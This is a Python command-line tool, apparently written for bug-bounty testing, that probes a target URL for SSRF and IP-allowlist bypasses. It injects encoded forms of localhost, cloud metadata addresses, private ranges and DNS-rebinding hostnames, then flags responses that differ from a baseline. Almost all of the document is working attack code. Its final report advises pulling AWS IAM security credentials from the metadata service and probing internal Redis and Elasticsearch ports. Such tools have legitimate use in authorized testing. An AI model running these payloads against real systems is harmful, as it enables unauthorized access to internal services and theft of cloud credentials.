#!/usr/bin/env python3
"""
IP Restriction Bypass Tester
By Rishu Raj Singh | Patliputra Anveshan Labs
anveshanlabs.in

Tests IP-based access restrictions using alternative IP representations:
- Decimal (2130706433)
- Octal (0177.0.0.1)
- Hex (0x7f000001)
- Mixed encoding
- IPv6 equivalents
- URL encoding
- DNS rebinding domains
- Cloud metadata endpoints

Use Case: SSRF bypass, WAF bypass, IP allowlist bypass

Usage:
    python3 ip_bypass_tester.py --url https://example.com/api/fetch?url=INJECT
    python3 ip_bypass_tester.py --url https://example.com/api/fetch?url=INJECT --ip 192.168.1.1
    python3 ip_bypass_tester.py --url https://example.com/api/fetch?url=INJECT --verbose
"""

import requests
import argparse
import socket
import sys
import time
from urllib.parse import quote
import warnings
warnings.filterwarnings("ignore")


# ─────────────────────────────────────────────
# COLORS
# ─────────────────────────────────────────────
class Color:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    RESET  = "\033[0m"
    BOLD   = "\033[1m"

def info(msg):    print(f"{Color.CYAN}[*]{Color.RESET} {msg}")
def success(msg): print(f"{Color.GREEN}[+]{Color.RESET} {msg}")
def warning(msg): print(f"{Color.YELLOW}[!]{Color.RESET} {msg}")
def error(msg):   print(f"{Color.RED}[-]{Color.RESET} {msg}")
def finding(msg): print(f"{Color.RED}{Color.BOLD}[BYPASS]{Color.RESET} {msg}")
def header(msg):  print(f"\n{Color.BLUE}{Color.BOLD}{'='*60}{Color.RESET}\n{Color.BLUE}{Color.BOLD}{msg}{Color.RESET}\n{Color.BLUE}{Color.BOLD}{'='*60}{Color.RESET}")


# ─────────────────────────────────────────────
# IP CONVERSION FUNCTIONS
# ─────────────────────────────────────────────
def ip_to_decimal(ip):
    """Convert IP to decimal: 127.0.0.1 → 2130706433"""
    parts = ip.split(".")
    return str((int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3]))

def ip_to_hex(ip):
    """Convert IP to hex: 127.0.0.1 → 0x7f000001"""
    parts = ip.split(".")
    return "0x" + "".join(f"{int(p):02x}" for p in parts)

def ip_to_hex_with_dots(ip):
    """Convert IP to hex with dots: 127.0.0.1 → 0x7f.0x0.0x0.0x1"""
    parts = ip.split(".")
    return ".".join(f"0x{int(p):02x}" for p in parts)

def ip_to_octal(ip):
    """Convert IP to octal: 127.0.0.1 → 0177.0.0.1"""
    parts = ip.split(".")
    return ".".join(f"0{oct(int(p))[2:]}" if int(p) > 0 else "0" for p in parts)

def ip_to_mixed(ip):
    """Mixed octal/decimal: 127.0.0.1 → 0177.0.0.1 variant"""
    parts = ip.split(".")
    return f"0x{int(parts[0]):02x}.{parts[1]}.{parts[2]}.{parts[3]}"

def ip_to_ipv6_mapped(ip):
    """IPv6 mapped: 127.0.0.1 → ::ffff:127.0.0.1"""
    return f"::ffff:{ip}"

def ip_to_ipv6_hex(ip):
    """IPv6 hex mapped: 127.0.0.1 → ::ffff:7f00:0001"""
    parts = ip.split(".")
    h1 = f"{int(parts[0]):02x}{int(parts[1]):02x}"
    h2 = f"{int(parts[2]):02x}{int(parts[3]):02x}"
    return f"::ffff:{h1}:{h2}"

def ip_to_long_decimal(ip):
    """Long form decimal with leading zeros: 127.0.0.1 → 127.000.000.001"""
    parts = ip.split(".")
    return ".".join(f"{int(p):03d}" for p in parts)

def generate_all_variants(ip):
    """Generate all IP representation variants"""
    variants = []

    # Standard
    variants.append(("Standard", ip))

    # Decimal
    variants.append(("Decimal", ip_to_decimal(ip)))

    # Hex (no dots)
    variants.append(("Hex (no dots)", ip_to_hex(ip)))

    # Hex (with dots)
    variants.append(("Hex (with dots)", ip_to_hex_with_dots(ip)))

    # Octal
    variants.append(("Octal", ip_to_octal(ip)))

    # Mixed
    variants.append(("Mixed hex/decimal", ip_to_mixed(ip)))

    # IPv6 mapped
    variants.append(("IPv6 mapped", ip_to_ipv6_mapped(ip)))

    # IPv6 hex
    variants.append(("IPv6 hex mapped", ip_to_ipv6_hex(ip)))

    # Long decimal
    variants.append(("Long decimal", ip_to_long_decimal(ip)))

    # URL encoded dots
    url_encoded = ip.replace(".", "%2e")
    variants.append(("URL encoded dots", url_encoded))

    # Double URL encoded
    double_encoded = ip.replace(".", "%252e")
    variants.append(("Double URL encoded dots", double_encoded))

    # Decimal with URL encoded
    decimal = ip_to_decimal(ip)
    variants.append(("Decimal (URL encoded)", quote(decimal)))

    return variants


# ─────────────────────────────────────────────
# WELL-KNOWN BYPASS TARGETS
# ─────────────────────────────────────────────
LOCALHOST_VARIANTS = [
    ("localhost", "localhost"),
    ("localhost uppercase", "LOCALHOST"),
    ("127.0.0.1", "127.0.0.1"),
    ("127.0.0.1 decimal", "2130706433"),
    ("127.0.0.1 hex", "0x7f000001"),
    ("127.0.0.1 octal", "0177.0.0.1"),
    ("127.0.0.1 IPv6", "::1"),
    ("127.0.0.1 IPv6 mapped", "::ffff:127.0.0.1"),
    ("127.0.0.1 IPv6 hex", "::ffff:7f00:0001"),
    ("127.1", "127.1"),
    ("127.0.1", "127.0.1"),
    ("0", "0"),
    ("0.0.0.0", "0.0.0.0"),
    ("000.000.000.000", "000.000.000.000"),
    ("0x00", "0x00"),
]

METADATA_VARIANTS = [
    # AWS metadata
    ("AWS metadata standard", "169.254.169.254"),
    ("AWS metadata decimal", "2852039166"),
    ("AWS metadata hex", "0xa9fea9fe"),
    ("AWS metadata octal", "0251.0376.0251.0376"),
    ("AWS metadata IPv6", "::ffff:a9fe:a9fe"),
    ("AWS metadata short", "169.254.169.254"),
    # GCP metadata
    ("GCP metadata", "metadata.google.internal"),
    ("GCP metadata IP", "169.254.169.254"),
    # Azure metadata
    ("Azure metadata", "169.254.169.254"),
    # DNS rebinding
    ("nip.io localhost", "127.0.0.1.nip.io"),
    ("xip.io localhost", "127.0.0.1.xip.io"),
    ("sslip.io localhost", "127.0.0.1.sslip.io"),
]

PRIVATE_RANGES = [
    ("10.0.0.1", "10.0.0.1"),
    ("10.0.0.1 decimal", "167772161"),
    ("10.0.0.1 hex", "0x0a000001"),
    ("192.168.1.1", "192.168.1.1"),
    ("192.168.1.1 decimal", "3232235777"),
    ("192.168.1.1 hex", "0xc0a80101"),
    ("172.16.0.1", "172.16.0.1"),
    ("172.16.0.1 decimal", "2886729729"),
]


# ─────────────────────────────────────────────
# BYPASS TESTER CLASS
# ─────────────────────────────────────────────
class IPBypassTester:
    def __init__(self, target_url, custom_ip=None, verbose=False, timeout=10):
        self.target_url = target_url  # URL with INJECT placeholder
        self.custom_ip = custom_ip
        self.verbose = verbose
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
        })
        self.bypasses_found = []
        self.baseline_status = None
        self.baseline_length = None

    def _inject(self, payload):
        """Replace INJECT placeholder with payload"""
        return self.target_url.replace("INJECT", payload)

    def _request(self, url):
        """Make request and return (status, length, response)"""
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
            return resp.status_code, len(resp.content), resp
        except Exception as e:
            if self.verbose:
                error(f"Request failed: {e}")
            return None, None, None

    def get_baseline(self):
        """Get baseline response for blocked IP"""
        header("STEP 1: Getting Baseline (blocked response)")
        # Use a known external IP to see what a normal blocked response looks like
        test_url = self._inject("8.8.8.8")
        status, length, resp = self._request(test_url)
        if status:
            self.baseline_status = status
            self.baseline_length = length
            info(f"Baseline (external IP): {status} | {length} bytes")
        else:
            warning("Could not get baseline response")

    def _is_bypass(self, status, length, resp):
        """Determine if response looks like a bypass"""
        if status is None:
            return False, "no response"

        # If we got a different status than baseline
        if self.baseline_status and status != self.baseline_status:
            return True, f"status changed: {self.baseline_status} → {status}"

        # If response is much longer than baseline (got actual content)
        if self.baseline_length and length > self.baseline_length * 2:
            return True, f"response size increased: {self.baseline_length} → {length} bytes"

        # Check for SSRF indicators in response
        if resp and resp.text:
            ssrf_indicators = [
                "ami-id", "instance-id", "meta-data",  # AWS metadata
                "computeMetadata",                        # GCP metadata
                "instanceId",                             # Azure metadata
                "root:", "/bin/bash",                     # /etc/passwd
                "localhost", "127.0.0.1",                 # Local service
                "internal",
            ]
            for indicator in ssrf_indicators:
                if indicator.lower() in resp.text.lower():
                    return True, f"SSRF content detected: '{indicator}' in response"

        return False, ""

    def test_localhost_bypass(self):
        """Test all localhost bypass variants"""
        header("STEP 2: Testing Localhost/127.0.0.1 Bypass Variants")

        for name, payload in LOCALHOST_VARIANTS:
            url = self._inject(payload)
            status, length, resp = self._request(url)

            if status is None:
                continue

            is_bypass, reason = self._is_bypass(status, length, resp)

            if is_bypass:
                finding(f"BYPASS FOUND [{name}]: {payload}")
                finding(f"  Reason: {reason}")
                finding(f"  URL: {url}")
                self.bypasses_found.append({
                    "category": "Localhost",
                    "name": name,
                    "payload": payload,
                    "url": url,
                    "status": status,
                    "reason": reason
                })
            elif self.verbose:
                info(f"[{name}] {payload} → {status} | {length} bytes")

            time.sleep(0.2)

    def test_metadata_bypass(self):
        """Test cloud metadata endpoint bypass"""
        header("STEP 3: Testing Cloud Metadata Bypass (SSRF)")

        for name, payload in METADATA_VARIANTS:
            url = self._inject(payload)
            status, length, resp = self._request(url)

            if status is None:
                continue

            is_bypass, reason = self._is_bypass(status, length, resp)

            if is_bypass:
                finding(f"BYPASS FOUND [{name}]: {payload}")
                finding(f"  Reason: {reason}")
                self.bypasses_found.append({
                    "category": "Cloud Metadata",
                    "name": name,
                    "payload": payload,
                    "url": url,
                    "status": status,
                    "reason": reason
                })
            elif self.verbose:
                info(f"[{name}] {payload} → {status} | {length} bytes")

            time.sleep(0.2)

    def test_private_range_bypass(self):
        """Test private IP range access"""
        header("STEP 4: Testing Private IP Range Bypass")

        for name, payload in PRIVATE_RANGES:
            url = self._inject(payload)
            status, length, resp = self._request(url)

            if status is None:
                continue

            is_bypass, reason = self._is_bypass(status, length, resp)

            if is_bypass:
                finding(f"BYPASS FOUND [{name}]: {payload}")
                finding(f"  Reason: {reason}")
                self.bypasses_found.append({
                    "category": "Private Range",
                    "name": name,
                    "payload": payload,
                    "url": url,
                    "status": status,
                    "reason": reason
                })
            elif self.verbose:
                info(f"[{name}] {payload} → {status} | {length} bytes")

            time.sleep(0.2)

    def test_custom_ip_variants(self):
        """Test all encoding variants of a custom IP"""
        if not self.custom_ip:
            return

        header(f"STEP 5: Testing All Variants of {self.custom_ip}")

        variants = generate_all_variants(self.custom_ip)
        for name, payload in variants:
            url = self._inject(payload)
            status, length, resp = self._request(url)

            if status is None:
                continue

            is_bypass, reason = self._is_bypass(status, length, resp)

            if is_bypass:
                finding(f"BYPASS FOUND [{name}]: {payload}")
                finding(f"  Reason: {reason}")
                self.bypasses_found.append({
                    "category": "Custom IP",
                    "name": name,
                    "payload": payload,
                    "url": url,
                    "status": status,
                    "reason": reason
                })
            else:
                info(f"[{name}] {payload} → {status} | {length} bytes")

            time.sleep(0.2)

    def generate_report(self):
        """Print final report"""
        header("FINAL REPORT")

        print(f"\n{'─'*60}")
        print(f"  Target URL:      {self.target_url}")
        print(f"  Custom IP:       {self.custom_ip or 'None'}")
        print(f"  Baseline Status: {self.baseline_status}")
        print(f"  Bypasses Found:  {len(self.bypasses_found)}")
        print(f"{'─'*60}")

        if self.bypasses_found:
            print(f"\n{Color.RED}{Color.BOLD}BYPASSES DETECTED:{Color.RESET}")
            for i, b in enumerate(self.bypasses_found, 1):
                print(f"\n  {i}. [{b['category']}] {b['name']}")
                print(f"     Payload: {b['payload']}")
                print(f"     Status:  {b['status']}")
                print(f"     Reason:  {b['reason']}")

            print(f"\n{Color.YELLOW}Next Steps for Each Bypass:{Color.RESET}")
            print("  1. Confirm manually in browser / Burp")
            print("  2. Try accessing AWS metadata: /latest/meta-data/iam/security-credentials/")
            print("  3. Try accessing internal services: :8080, :8443, :6379 (Redis), :9200 (Elasticsearch)")
            print("  4. Document full impact for bug report")
        else:
            print(f"\n{Color.GREEN}No bypasses detected.{Color.RESET}")
            print("  The target appears to properly validate IP representations.")

        print(f"\n{Color.CYAN}Quick Reference — Decimal IP Conversions:{Color.RESET}")
        print("  127.0.0.1    → 2130706433  (localhost)")
        print("  169.254.169.254 → 2852039166  (AWS metadata)")
        print("  192.168.1.1  → 3232235777  (common internal)")
        print("  10.0.0.1     → 167772161   (common internal)")

        print(f"\nTool by Rishu Raj Singh | Patliputra Anveshan Labs")
        print(f"anveshanlabs.in | HackerOne: rishusec | medium.com/@rishuraj2666\n")

    def run(self):
        print(f"""
{Color.GREEN}{Color.BOLD}
 ██╗██████╗     ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
 ██║██╔══██╗    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
 ██║██████╔╝    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
 ██║██╔═══╝     ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
 ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
 ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
{Color.RESET}""")
        print(f"IP Restriction Bypass Tester v1.0")
        print(f"By Rishu Raj Singh | Patliputra Anveshan Labs")
        print(f"anveshanlabs.in\n")
        print(f"Target: {self.target_url}")
        print(f"Custom IP: {self.custom_ip or 'Not specified (testing localhost + metadata)'}\n")

        self.get_baseline()
        self.test_localhost_bypass()
        self.test_metadata_bypass()
        self.test_private_range_bypass()
        self.test_custom_ip_variants()
        self.generate_report()


# ─────────────────────────────────────────────
# STANDALONE IP CONVERTER (no target needed)
# ─────────────────────────────────────────────
def print_all_variants(ip):
    print(f"\n{Color.BOLD}All representations of {ip}:{Color.RESET}\n")
    variants = generate_all_variants(ip)
    for name, val in variants:
        print(f"  {Color.CYAN}{name:<30}{Color.RESET} {val}")
    print()


# ─────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="IP Restriction Bypass Tester — tests SSRF/WAF bypass via IP encoding",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test SSRF endpoint (INJECT is replaced with each payload)
  python3 ip_bypass_tester.py --url "https://target.com/fetch?url=INJECT"

  # Test with a specific internal IP
  python3 ip_bypass_tester.py --url "https://target.com/fetch?url=INJECT" --ip 192.168.1.1

  # Just convert an IP to all formats (no target needed)
  python3 ip_bypass_tester.py --convert 169.254.169.254

  # Verbose output
  python3 ip_bypass_tester.py --url "https://target.com/fetch?url=INJECT" --verbose
        """
    )
    parser.add_argument("--url", help="Target URL with INJECT placeholder where IP goes")
    parser.add_argument("--ip", help="Custom IP to test all encoding variants of")
    parser.add_argument("--convert", help="Just convert this IP to all formats and exit")
    parser.add_argument("--verbose", action="store_true", help="Show all requests including non-bypasses")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")

    args = parser.parse_args()

    if args.convert:
        print_all_variants(args.convert)
        sys.exit(0)

    if not args.url:
        parser.print_help()
        print(f"\n{Color.YELLOW}Quick IP conversions:{Color.RESET}")
        print_all_variants("127.0.0.1")
        print_all_variants("169.254.169.254")
        sys.exit(0)

    if "INJECT" not in args.url:
        error("URL must contain INJECT placeholder. Example: --url 'https://target.com/fetch?url=INJECT'")
        sys.exit(1)

    tester = IPBypassTester(
        target_url=args.url,
        custom_ip=args.ip,
        verbose=args.verbose,
        timeout=args.timeout
    )
    tester.run()


if __name__ == "__main__":
    main()
